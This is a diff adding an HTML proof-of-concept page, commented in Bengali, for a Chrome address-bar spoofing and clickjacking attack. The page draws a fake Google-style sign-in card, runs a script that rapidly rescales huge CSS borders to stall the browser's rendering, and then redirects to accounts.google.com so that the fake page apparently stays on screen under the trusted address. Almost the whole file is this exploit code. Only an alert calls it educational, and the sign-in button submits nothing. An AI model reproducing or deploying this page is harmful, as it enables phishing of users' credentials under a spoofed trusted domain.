@@ -1,0 +1,230 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>Loading...</title>
+    <style>
+        /* === এই সিএসএস ক্রোমের রেন্ডারিং ইঞ্জিনকে ধীর করে দেবে === */
+        :root {
+            --scale-factor: 1;
+        }
+        
+        /* ক্রিপ্টিক সিএসএস - GPU কে ব্যস্ত রাখবে */
+        .gpu-killer {
+            border-right: 99ex dotted #ff9966;
+            border-bottom: 99ex dotted #ff9966;
+            border-end-end-radius: 99999999999999999999999999999999999999999999999999999999999em;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 9999;
+            transform: scale(var(--scale-factor));
+            opacity: 0.99;
+        }
+        
+        /* অদ্ভুত ফন্ট ব্যবহার */
+        .crazy-font {
+            font: 999999999999999999999999999999999999999999vmax/9999 "Ahem", "Comic Sans MS";
+            color: transparent;
+            user-select: none;
+            position: fixed;
+            bottom: 0;
+            right: 0;
+        }
+        
+        /* আসল UI এলিমেন্ট - যা দেখাবে ফেক লগিন পেজ */
+        .fake-login-ui {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: white;
+            z-index: 10000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            transition: opacity 0.3s ease;
+        }
+        
+        .login-card {
+            background: white;
+            padding: 40px 20px;
+            border-radius: 12px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            text-align: center;
+            width: 85%;
+            max-width: 320px;
+            border: 1px solid #dadce0;
+        }
+        
+        .login-card h1 {
+            font-size: 24px;
+            margin-bottom: 20px;
+            color: #202124;
+        }
+        
+        .login-card input {
+            width: 90%;
+            padding: 12px;
+            margin: 8px 0;
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            font-size: 16px;
+        }
+        
+        .login-card button {
+            width: 100%;
+            padding: 12px;
+            background: #1a73e8;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            margin-top: 12px;
+            cursor: pointer;
+        }
+        
+        .login-card button:active {
+            background: #1557b0;
+        }
+        
+        /* সতর্কবার্তা - এটা শুধু শিক্ষামূলক */
+        .warning-msg {
+            position: fixed;
+            bottom: 20px;
+            left: 20px;
+            background: rgba(0,0,0,0.7);
+            color: #ffaa00;
+            padding: 8px 12px;
+            border-radius: 8px;
+            font-size: 12px;
+            z-index: 10001;
+            font-family: monospace;
+            pointer-events: none;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ফেক লগইন ইউজার ইন্টারফেস (এটা দেখাবে) -->
+    <div class="fake-login-ui" id="fakeUI">
+        <div class="login-card">
+            <h1>Sign in</h1>
+            <input type="email" placeholder="Email or phone" value="hacker@attacker.com">
+            <input type="password" placeholder="Password">
+            <button id="fakeLoginBtn">Sign in</button>
+        </div>
+    </div>
+
+    <!-- জিপিইউ কিলার এলিমেন্ট (এটা রেন্ডারিং ধীর করবে) -->
+    <div class="gpu-killer" id="gpuKiller"></div>
+    <div class="crazy-font">LOADING SYSTEM DATA... █▓▒░ █▓▒░ █▓▒░</div>
+
+    <script>
+        (function() {
+            // ==================================================
+            // স্পুফিং প্যারামিটার
+            // ==================================================
+            const TARGET_URL = "https://accounts.google.com";  // এড্রেস বার যা দেখাবে (বিশ্বস্ত ডোমেইন)
+            const REDIRECT_DELAY = 2500; // ২.৫ সেকেন্ড পর URL বদলে যাবে
+            
+            // জিপিইউ কিলার এলিমেন্ট
+            const root = document.documentElement;
+            const gpuDiv = document.getElementById('gpuKiller');
+            let intervalId = null;
+            
+            // ==================================================
+            // জিপিইউকে ব্যস্ত রাখার ফাংশন (বর্ডার রেডিয়াস রিকম্পিউট)
+            // ==================================================
+            function startGPUKiller() {
+                if (intervalId) clearInterval(intervalId);
+                
+                intervalId = setInterval(function() {
+                    // এলোমেলো স্কেল ফ্যাক্টর প্রয়োগ করুন
+                    const randomScale = 1 + (Math.random() * 15);
+                    root.style.setProperty('--scale-factor', randomScale);
+                    
+                    // যদি এলিমেন্টটি DOM এ থাকে, তাহলে forcefully রি-রেন্ডার করুন
+                    if (gpuDiv) {
+                        // স্টাইল পরিবর্তন করে GPU তে কাজ দিতে থাকুন
+                        gpuDiv.style.borderEndEndRadius = (Math.random() * 9999999999999999) + 'em';
+                        gpuDiv.style.borderRight = (Math.random() * 500) + 'ex dotted peru';
+                    }
+                    
+                    // কনসোলে লগ (শুধু ডিবাগের জন্য)
+                    // console.log('GPU animation frame', randomScale);
+                }, 50); // প্রতি ৫০ মিলিসেকেন্ডে চেঞ্জ (খুব দ্রুত)
+            }
+            
+            // ==================================================
+            // মেইন স্পুফিং লজিক: URL পরিবর্তন করুন
+            // ==================================================
+            function triggerSpoof() {
+                // ক্লিয়ার ইন্টারভাল - কাজ শেষে GPU কিলার বন্ধ করুন
+                if (intervalId) {
+                    clearInterval(intervalId);
+                    intervalId = null;
+                }
+                
+                console.log('[!] Spoofing: Changing address bar to', TARGET_URL);
+                // এড্রেস বার পরিবর্তন করুন
+                window.location.href = TARGET_URL;
+                
+                // কিন্তু ফেক UI টি দেখাতে থাকুন
+                // নোট: location.href পরিবর্তনের পর পেজ আনলোড হবে, কিন্তু পুরনো জিপিইউ টাস্কের কারণে
+                // ক্রোম সম্ভবত কয়েক সেকেন্ড পুরনো UI টি দেখাবে। এটাই বাগ!
+            }
+            
+            // ==================================================
+            // এক্সট্রা: ক্লিকজ্যাকিং ডেমো (যদি নিচের পেজে বাটন থাকে)
+            // ==================================================
+            function setupClickjackingDemo() {
+                const fakeBtn = document.getElementById('fakeLoginBtn');
+                if (fakeBtn) {
+                    fakeBtn.addEventListener('click', function(e) {
+                        e.preventDefault();
+                        console.log('[!] Fake Login Button Clicked!');
+                        console.log('[!] In real attack, this would have clicked on the REAL website button below!');
+                        
+                        // পপআপ দেখান
+                        alert("⚠️ EDUCATIONAL DEMO ⚠️\n\nIf this was a real attack, clicking this 'Sign in' button would have:\n1. Submitted your credentials to the attacker\n2. OR Clicked on the 'Allow' button of the real website hidden below!\n\nThis is Clickjacking + Address Bar Spoofing.\n\n✅ Report this to bug bounty programs responsibly.");
+                        
+                        // এখানে আপনি ইচ্ছে করলে real site-এর element এ ক্লিক simulate করতে পারেন
+                        // document.elementFromPoint(x, y)?.click();
+                    });
+                }
+            }
+            
+            // ==================================================
+            // ডকুমেন্ট লোড হলে শুরু করুন
+            // ==================================================
+            window.addEventListener('load', function() {
+                console.log('[+] Educational POC Loaded');
+                console.log('[+] GPU Killer started...');
+                
+                // জিপিইউ কিলার শুরু করুন
+                startGPUKiller();
+                
+                // ক্লিকজ্যাকিং সেটআপ
+                setupClickjackingDemo();
+                
+                // নির্দিষ্ট সময় পর স্পুফ ট্রিগার করুন
+                console.log(`[+] Will change address bar to ${TARGET_URL} in ${REDIRECT_DELAY/1000} seconds...`);
+                setTimeout(triggerSpoof, REDIRECT_DELAY);
+                
+                // এডুকেশনাল ওয়ার্নিং
+                const warningDiv = document.createElement('div');
+                warningDiv.className = 'warning-msg';
+                warningDiv.innerHTML = '🔐 EDUCATIONAL POC ONLY | Address bar will spoof to ' + TARGET_URL + ' but page remains fake!';
+                document.body.appendChild(warningDiv);
+            });
+        })();
+    </script>
+</body>
+</html>
